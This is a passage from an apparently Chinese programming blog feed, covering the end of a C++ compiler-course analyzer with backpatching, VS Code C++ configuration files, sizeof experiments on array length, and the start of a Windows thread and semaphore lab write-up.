class="built_in">push</span>(tmpTp);</span><br><span class="line">            &#125;</span><br><span class="line">            tmpStr = calcNS.<span class="built_in">top</span>();</span><br><span class="line">            calcNS.<span class="built_in">pop</span>();</span><br><span class="line">            NS.<span class="built_in">push</span>(tmpStr);    <span class="comment">// 入关系运算操作数栈</span></span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">addV4</span><span class="params">(vector&lt;string&gt; V)</span></span>&#123;</span><br><span class="line">            V4.<span class="built_in">push_back</span>(V);</span><br><span class="line">            <span class="keyword">if</span>(V[<span class="number">0</span>] == <span class="string">&quot;j&quot;</span>)&#123;    <span class="comment">// 新添加语句是无条件跳转语句</span></span><br><span class="line">                <span class="keyword">while</span>(!tdS.<span class="built_in">empty</span>())&#123;    <span class="comment">// 待语句出现再回填</span></span><br><span class="line">                    pair&lt;<span class="type">int</span>, string&gt; tmp = tdS.<span class="built_in">top</span>();</span><br><span class="line">                    tdS.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="built_in">linkUpV4</span>(tmp.first, V[<span class="number">3</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;        <span class="comment">// 无用语句</span></span><br><span class="line">                <span class="keyword">while</span>(!tdS.<span class="built_in">empty</span>())&#123;    <span class="comment">// 待语句出现再回填</span></span><br><span class="line">                    pair&lt;<span class="type">int</span>, string&gt; tmp = tdS.<span class="built_in">top</span>();</span><br><span class="line">                    tdS.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="built_in">linkUpV4</span>(tmp.first, tmp.second);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> V4.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">linkUpV4</span><span class="params">(<span class="type">int</span> idx, string dst)</span></span>&#123;    <span class="comment">// 按链条回填</span></span><br><span class="line">            string tmps = V4[idx][<span class="number">0</span>].<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">1</span>); </span><br><span class="line">            <span class="keyword">if</span>(tmps == <span class="string">&quot;j&quot;</span> &amp;&amp; <span class="built_in">stoi</span>(dst) &gt;= <span class="built_in">int</span>(V4.<span class="built_in">size</span>()))&#123;  <span class="comment">// 无条件跳转 且 跳转目标尚未确定 ——这种情况一般是下一条即将填写的语句就是目标语句</span></span><br><span class="line">                tdS.<span class="built_in">push</span>(&#123;idx, dst&#125;);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            string s = V4[idx][<span class="number">3</span>], nul = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(s != nul)&#123;</span><br><span class="line">                <span class="built_in">upV4</span>(idx, <span class="number">3</span>, dst);</span><br><span class="line">                idx = <span class="built_in">lastJ</span>(idx);</span><br><span class="line">                s = V4[idx][<span class="number">3</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">upV4</span>(idx, <span class="number">3</span>, dst);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">upV4</span><span class="params">(<span class="type">int</span> idx1, <span class="type">int</span> idx2, string dst)</span></span>&#123;  <span class="comment">// 单个修改</span></span><br><span class="line">            V4[idx1][idx2] = dst;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">backV4</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">            string s = V4[idx][<span class="number">3</span>], nul = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">            <span class="type">int</span> tmp;</span><br><span class="line">            <span class="keyword">if</span>(s == nul)&#123;   <span class="comment">// 值为空</span></span><br><span class="line">                tmp = <span class="built_in">lastJ</span>(idx);</span><br><span class="line">                <span class="built_in">upV4</span>(idx, <span class="number">3</span>, <span class="built_in">to_string</span>(tmp));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">linkUpV4</span>(<span class="built_in">lastJ</span>(idx), s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    wordsAnalyzer *wA = <span class="keyword">new</span> <span class="built_in">wordsAnalyzer</span>(<span class="number">1</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">printSplit</span>(<span class="string">&quot;Lexical Analysis&quot;</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    semanticAnalyzer *sA = <span class="keyword">new</span> <span class="built_in">semanticAnalyzer</span>(wA-&gt;<span class="built_in">getTV</span>(), wA-&gt;<span class="built_in">getSV</span>());</span><br><span class="line">    sA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    sA-&gt;<span class="built_in">getOut</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="VSC-C-环境配置"><a href="#VSC-C-环境配置" class="headerlink" title="VSC C++环境配置"></a>VSC C++环境配置</h3><p>重新配置C++环境时，忘记配置编译器的环境变量，捣鼓了VSC的配置文件好久，发现了一些有意思的事。</p>
<p>编译连接C++的编译器是”g++.exe”，用于调试链接生成的可执行文件的是”gdb.exe”，在VSC中想要使用C++，一般需要先配置环境。</p>
<ol>
<li><p><code>Ctrl+Shift+P</code> 打开控制台，输入 “C&#x2F;C++: Edit Configurations (UI)”，进入配置页面，选择编译器路径为下载的MinGW中的”MinGW&#x2F;bin&#x2F;g++.exe”，选择IntelliSense模式为”windows-gcc-x64”。点击输入框外的地方vsc就会自动保存设置，并在当前文件夹下生成一个”.vscode”文件夹，里面会有一个”c_cpp_properties.json”文件，包含了C++的编译器配置。</p>
</li>
<li><p>“.vscode”下，”tasks.json”文件提供了编译链接CPP文件的设置，demo：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span>	</span><br><span class="line">        <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: g++.exe build active file&quot;</span><span class="punctuation">,</span>		<span class="comment">// tasks的链接标签</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;F:\\CPP\\MinGW\\bin\\g++.exe&quot;</span><span class="punctuation">,</span>			<span class="comment">// 输入g++的路径</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>	<span class="comment">// 链接所得的exe文件的位置</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span>	<span class="comment">// 设置工作目录，它决定了代码中相对路径的起始路径</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span>							<span class="comment">// 即&quot;./&quot;所代表的位置</span></span><br><span class="line">        <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;$gcc&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Task generated by Debugger.&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><code>$&#123;fileDirname&#125;</code> 表示源码所在文件夹的文件夹名称，带”&#x2F;“；<code>$&#123;fileBasenameNoExtension&#125;</code> 表示源码文件名，不带扩展名。</p>
<p>有该文件的情况下，配置了编译器的环境变量，则已经可以编译调试运行C++程序了。如果没有配置环境变量，将”cwd”设置为编译器所在文件夹，也能编译，因为这样vsc也能访问到g++来链接程序，但相对路径的起始位置将被捆绑为该文件夹，源码中将无法使用正确的相对路径，只能采用绝对路径。</p>
</li>
<li><p>“launch.json”文件提供了调试运行链接生成的可执行文件的设置，demo：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) 启动&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span>		</span><br><span class="line">        <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span>	<span class="comment">// exe位置</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span>	<span class="comment">// 设置工作目录，即相对路径起始位置</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span>	<span class="comment">// 弹出外部shell——不便于看到历史调试记录</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span>			<span class="comment">// 虽然vsc的内部终端也会吞输出就是了</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;F:/CPP/MinGW/bin/gdb.exe&quot;</span><span class="punctuation">,</span>	<span class="comment">// 调试器gdb所在位置 	</span></span><br><span class="line">        <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: g++.exe build active file&quot;</span><span class="punctuation">,</span>	<span class="comment">// 要与tasks.json的</span></span><br><span class="line">    <span class="punctuation">&#125;</span>	<span class="comment">// label相对应，该配置才能正确被采用</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>该文件不是必要的，但它提供了更丰富的调试配置，通过”label”与”preLaunchTask”将链接与调试操作连接起来，依据配置文件依次执行。若某份源码在之前的编译中已经生成了exe文件，但在某次调试中编译出现问题，此时如果设置了弹出外部终端，则该源码的旧exe文件将会被执行，输出在shell中的部分由于闪退将不可得，但文件操作的留下痕迹的行为将正常保留。<br>当两个配置文件”cwd”冲突时，以”launch.json”的cwd为主。</p>
</li>
</ol>
<h3 id="C-数组操作"><a href="#C-数组操作" class="headerlink" title="C++数组操作"></a>C++数组操作</h3><h4 id="数组长度快速获取"><a href="#数组长度快速获取" class="headerlink" title="数组长度快速获取"></a>数组长度快速获取</h4><p>测试源码1：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getLen</span><span class="params">(<span class="type">int</span> *p)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;sizeof(p) = &quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(p)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;sizeof(p[0]) = &quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(p[<span class="number">0</span>])&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;p = &quot;</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;p[0] = &quot;</span>&lt;&lt;p[<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sizeof</span>(p)/<span class="built_in">sizeof</span>(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span> lenth = <span class="built_in">getLen</span>(a);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;len = &quot;</span>&lt;&lt;lenth;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sizeof(p) = 8   </span><br><span class="line">sizeof(p[0]) = 4</span><br><span class="line">p = 0x61fe00</span><br><span class="line">p[0] = 1</span><br><span class="line">len = 2</span><br></pre></td></tr></table></figure></div>

<p>int类型的指针（或数组）长度结果默认为8，该结果固定。</p>
<p>测试源码2：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getLen</span><span class="params">(T &amp;p)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;sizeof(p) = &quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(p)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;sizeof(p[0]) = &quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(p[<span class="number">0</span>])&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;p = &quot;</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;p[0] = &quot;</span>&lt;&lt;p[<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sizeof</span>(p)/<span class="built_in">sizeof</span>(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span> lenth = <span class="built_in">getLen</span>(a);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;len = &quot;</span>&lt;&lt;lenth;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sizeof(p) = 24  </span><br><span class="line">sizeof(p[0]) = 4</span><br><span class="line">p = 0x61fe00</span><br><span class="line">p[0] = 1</span><br><span class="line">len = 6</span><br></pre></td></tr></table></figure></div>

<p>可以成功获取到正确的长度，传入为引用时必须要设置为模板，否则不过编译。</p>
<p>当将a设置为指针时：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sizeof(p) = 8   </span><br><span class="line">sizeof(p[0]) = 4</span><br><span class="line">p = 0x744150</span><br><span class="line">p[0] = 1</span><br><span class="line">len = 2</span><br></pre></td></tr></table></figure></div>

<p>也不能获取到正确的长度</p>
<h4 id="数组快速构造"><a href="#数组快速构造" class="headerlink" title="数组快速构造"></a>数组快速构造</h4><p>初始化数组时：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Development</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Schoolwork</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验-线程同步</title>
    <url>/2023/05/08/Development/Algorithm/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
    <content><![CDATA[<p>使用Windows提供的API线程接口实现。</p>
<p>参考：<a class="link"   href="https://blog.csdn.net/qq_41924554/article/details/118335070" >C++创建线程示例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/a3192048/article/details/82152618" >C++多线程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://learn.microsoft.com/zh-cn/windows/win32/procthread/multiple-threads" >微软多线程编程文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<h2 id="线程创建与撤销"><a href="#线程创建与撤销" class="headerlink" title="线程创建与撤销"></a>线程创建与撤销</h2><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p><code>LPVOID</code> 是无类型指针，做形参可接收任意类型的指针</p>
<p><code>Void ExitThread(DWORD dwExitCode)</code> 在线程函数内执行该线程的撤销，等价于内部的return。</p>
<p><code>Bool TerminateThread( HANDLE hThread, DWORD dwExitCode)</code> 在线程函数外部强行终止指定线程，并赋予指定结束码。</p>
<p><code>Sleep(DWORD dwMilliseconds)</code> 挂起当前线程，dwMilliseconds为挂起传入时间，单位为ms；取值为INFINITE则无限延迟，设为0ms则立即交出时间片。</p>
<p><code>Bool CloseHandle(HANDLE hObject)</code> 关闭句柄</p>
<p><code>CreateThread()</code> 参数1为安全策略，参数2为初始栈规模，参数3为回调函数（有指定格式），参数4为回调函数的参数（一个结构体），参数5为线程何时开始运行，参数6为获取线程id的指针。<br>示例：<code>CreateThread(NULL, 0, test, NULL, 0, NULL)</code> 表示安全策略默认；初始栈规模默认；函数使用形如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">test</span><span class="params">(LPVOID)</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>的test函数；无传入参数；线程创建后立即执行；不读取线程id。</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">hello</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">name</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;My name is ZYX.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">timely</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Please wait for 5s.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;I wake up!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">ExitThread</span>(<span class="number">0</span>);  <span class="comment">// 等价于 return 0;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HANDLE threada, threadb, threadc;</span><br><span class="line">    threada = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, hello, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    threadb = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, name, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    threadc = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, timely, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">6000</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(threada);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(threadb);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(threadc);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Main thread ends.&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>参考：<a class="link"   href="https://www.cnblogs.com/priarieNew/p/9753419.html" >C++信号量用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><p><code>CreateSemaphore()</code> 创建信号量并返回一个句柄，该句柄用于表示特定的信号量对象。<br>参数1表示安全策略，参数2表示基础资源数量，参数3表示最大资源数量，参数4为信号量命名。<br><strong>同一命名创建的信号量是共享实时资源数量的</strong>。</p>
<p><code>OpenSemaphore()</code> 表示打开一类已有的信号量，赋予一个新的句柄一个新的信号量对象。</p>
<p><code>WaitForSingleObject(Semaphore, INFINITE)</code> 会等待信号量处于信号态（资源数量&gt;0）再继续执行，同时会使目标信号量减一，即再次占用资源。</p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">test</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line">HANDLE myThread, mySemaphore;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">    mySemaphore = <span class="built_in">OpenSemaphore</span>(SYNCHRONIZE | SEMAPHORE_MODIFY_STATE, <span class="literal">NULL</span>, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">    myThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, test, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(mySemaphore, INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(mySemaphore);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(myThread);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Main thread ends.&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">test</span><span class="params">(LPVOID par)</span></span>&#123;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;I am over.\n&quot;</span>;</span><br><span class="line">    <span 